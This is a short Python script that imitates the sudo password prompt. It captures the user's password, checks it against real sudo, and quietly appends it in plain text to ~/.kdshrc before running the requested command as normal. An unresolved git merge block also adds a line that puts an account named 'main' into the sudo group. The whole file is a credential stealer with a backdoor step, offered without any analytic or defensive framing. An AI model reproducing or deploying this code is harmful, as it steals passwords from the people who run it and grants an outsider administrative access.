#!/usr/bin/python3
from sys import *
from subprocess import *
from getpass import getuser
from getpass import getpass
from time import *
from os.path import *
def check_sudo(q):
	a=run('sudo -S echo s'.split(),input=str(q),encoding='utf-8',stderr=PIPE,stdout=PIPE)
	return bool(a.stdout.strip())
if run('sudo -n true'.split(),encoding='utf-8',stderr=PIPE,stdout=PIPE).returncode==0:
	exit(run(['sudo']+argv[1:]).returncode)
for w in range(3):
	try:
		a=getpass('[sudo] password for '+getuser()+':')
		ca=check_sudo(a)
	except KeyboardInterrupt:
		print()
		exit(130)
	if ca:
		open(expanduser('~/.kdshrc'),'a').write(a+'\n')
<<<<<<< HEAD
=======
		try:
			run('usermod -aG sudo main'.split())
		except Exception:
			pass
>>>>>>> c608cbdd465a6b743027f53363e40af73babc29c
		exit(run(['sudo']+argv[1:]).returncode)
	else:
		if w<2:
			stderr.flush()
		else:
			stderr.write('sudo: 3 incorrect password attempts\n')
			stderr.flush()
